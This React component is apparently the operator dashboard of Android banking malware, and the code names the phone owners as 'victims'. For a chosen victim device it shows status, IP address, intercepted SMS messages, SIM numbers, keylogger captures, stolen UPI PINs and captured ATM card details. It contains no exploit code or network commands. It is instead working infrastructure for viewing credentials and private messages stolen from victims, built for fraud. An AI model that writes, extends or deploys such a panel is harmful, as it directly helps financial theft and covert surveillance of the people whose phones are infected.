import { useState } from 'react';
import { X, Smartphone, MessageSquare, Phone, Keyboard, CreditCard, Building } from 'lucide-react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Button } from '@/components/ui/button';
import { useDB } from '@/hooks/useDB';
import { getRelativeTime } from '@/utils/time';

interface DeviceDetailProps {
  victimId: string;
  onClose: () => void;
}

export function DeviceDetail({ victimId, onClose }: DeviceDetailProps) {
  const { db, getVictimMessages, getSims, getKeyLogs, getUPIs, getATMCards } = useDB();
  const device = db.DeviceInfo[victimId];
  const messages = getVictimMessages(victimId);
  const sims = getSims(victimId);
  const keyLogs = getKeyLogs(victimId);
  const upiPins = getUPIs(victimId);
  const atmCards = getATMCards(victimId);

  if (!device) {
    return null;
  }

  return (
    <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 animate-fade-in">
      <div className="fixed right-0 top-0 h-full w-full max-w-2xl bg-background shadow-2xl animate-slide-up overflow-y-auto">
        {/* Header */}
        <div className="sticky top-0 bg-background/80 backdrop-blur-md border-b p-6 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-primary to-accent flex items-center justify-center">
              <Smartphone className="w-5 h-5 text-white" />
            </div>
            <div>
              <h2 className="text-xl font-semibold">Device Detail</h2>
              <p className="text-sm text-muted-foreground">{victimId}</p>
            </div>
          </div>
          <Button 
            variant="ghost" 
            size="icon" 
            onClick={onClose}
            className="hover:bg-destructive/10 hover:text-destructive"
          >
            <X className="w-5 h-5" />
          </Button>
        </div>

        {/* Content */}
        <div className="p-6">
          <Tabs defaultValue="overview" className="w-full">
            <TabsList className="grid w-full grid-cols-6 bg-muted/50">
              <TabsTrigger value="overview" className="flex items-center gap-1">
                <Smartphone className="w-3 h-3" />
                <span className="hidden sm:inline">Overview</span>
              </TabsTrigger>
              <TabsTrigger value="messages" className="flex items-center gap-1">
                <MessageSquare className="w-3 h-3" />
                <span className="hidden sm:inline">Messages</span>
              </TabsTrigger>
              <TabsTrigger value="sims" className="flex items-center gap-1">
                <Phone className="w-3 h-3" />
                <span className="hidden sm:inline">Sims</span>
              </TabsTrigger>
              <TabsTrigger value="keylogs" className="flex items-center gap-1">
                <Keyboard className="w-3 h-3" />
                <span className="hidden sm:inline">Key logs</span>
              </TabsTrigger>
              <TabsTrigger value="upipins" className="flex items-center gap-1">
                <CreditCard className="w-3 h-3" />
                <span className="hidden sm:inline">UPI pins</span>
              </TabsTrigger>
              <TabsTrigger value="atmcards" className="flex items-center gap-1">
                <Building className="w-3 h-3" />
                <span className="hidden sm:inline">ATM cards</span>
              </TabsTrigger>
            </TabsList>

            <TabsContent value="overview" className="mt-6">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Smartphone className="w-5 h-5" />
                    Device Information
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4 font-mono text-sm">
                    <div className="space-y-3">
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">Device:</span>
                        <span className="font-medium">{victimId}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">Status:</span>
                        <Badge className={device.Status === 'Online' ? 'badge-online' : 'badge-offline'}>
                          {device.Status}
                        </Badge>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">Android:</span>
                        <span>{device.AndroidVersion}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">IP Address:</span>
                        <span>{device.IPAddress}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">UPI Pin:</span>
                        <code className="bg-muted px-2 py-1 rounded text-xs">{device.UPIPin}</code>
                      </div>
                    </div>
                    <div className="space-y-3">
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">Note:</span>
                        <span>{device.Note}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">Added:</span>
                        <span>{device.Added}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">Apps Installed:</span>
                        <Badge variant="outline">{device.AppsInstalled}</Badge>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">Battery:</span>
                        <Badge variant={parseInt(device.Battery?.replace('%', '') || '0') < 20 ? 'destructive' : 'default'}>
                          {device.Battery}
                        </Badge>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="messages" className="mt-6">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <MessageSquare className="w-5 h-5" />
                    Messages ({messages.length})
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  {messages.length === 0 ? (
                    <p className="text-muted-foreground text-center py-8">No messages found</p>
                  ) : (
                    <div className="space-y-4 max-h-96 overflow-y-auto">
                      {messages.map((msg, idx) => (
                        <div key={idx} className="p-4 bg-muted/30 rounded-lg border">
                          <div className="flex items-start justify-between gap-3 mb-2">
                            <span className="font-medium text-sm">{msg.Sender}</span>
                            <div className="flex items-center gap-2">
                              <Badge variant="outline" className="text-xs">{msg.SmsType}</Badge>
                              <span className="text-xs text-muted-foreground">{getRelativeTime(msg.Time)}</span>
                            </div>
                          </div>
                          <p className="text-sm text-muted-foreground">{msg.Body}</p>
                        </div>
                      ))}
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="sims" className="mt-6">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Phone className="w-5 h-5" />
                    SIM Cards ({sims.length})
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  {sims.length === 0 ? (
                    <p className="text-muted-foreground text-center py-8">No SIM cards found</p>
                  ) : (
                    <div className="space-y-3">
                      {sims.map((sim, idx) => (
                        <div key={idx} className="flex items-center justify-between p-3 bg-muted/30 rounded-lg">
                          <div>
                            <span className="font-medium">Slot {sim.slot}</span>
                            <p className="text-sm text-muted-foreground">{sim.carrier || 'No carrier'}</p>
                          </div>
                          <code className="text-sm">{sim.number || 'No number'}</code>
                        </div>
                      ))}
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="keylogs" className="mt-6">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Keyboard className="w-5 h-5" />
                    Key Logs ({keyLogs.length})
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  {keyLogs.length === 0 ? (
                    <p className="text-muted-foreground text-center py-8">No key logs found</p>
                  ) : (
                    <div className="space-y-3 max-h-96 overflow-y-auto">
                      {keyLogs.map((log, idx) => (
                        <div key={idx} className="p-3 bg-muted/30 rounded-lg border font-mono">
                          <div className="flex items-center justify-between mb-1">
                            <span className="text-xs text-muted-foreground">{getRelativeTime(log.time)}</span>
                          </div>
                          <code className="text-sm">{log.text}</code>
                        </div>
                      ))}
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="upipins" className="mt-6">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <CreditCard className="w-5 h-5" />
                    UPI Pins ({upiPins.length})
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  {upiPins.length === 0 ? (
                    <p className="text-muted-foreground text-center py-8">No UPI pins found</p>
                  ) : (
                    <div className="space-y-2">
                      {upiPins.map((pin, idx) => (
                        <div key={idx} className="p-3 bg-muted/30 rounded-lg">
                          <code className="text-sm font-mono">{pin}</code>
                        </div>
                      ))}
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="atmcards" className="mt-6">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Building className="w-5 h-5" />
                    ATM Cards ({atmCards.length})
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  {atmCards.length === 0 ? (
                    <p className="text-muted-foreground text-center py-8">No ATM cards found</p>
                  ) : (
                    <div className="space-y-3">
                      {atmCards.map((card, idx) => (
                        <div key={idx} className="p-4 bg-muted/30 rounded-lg border">
                          <div className="flex items-center justify-between">
                            <div>
                              <p className="font-medium">{card.bank} Bank</p>
                              <p className="text-sm text-muted-foreground">{card.name}</p>
                            </div>
                            <code className="text-sm">****{card.last4}</code>
                          </div>
                        </div>
                      ))}
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>
          </Tabs>
        </div>
      </div>
    </div>
  );
}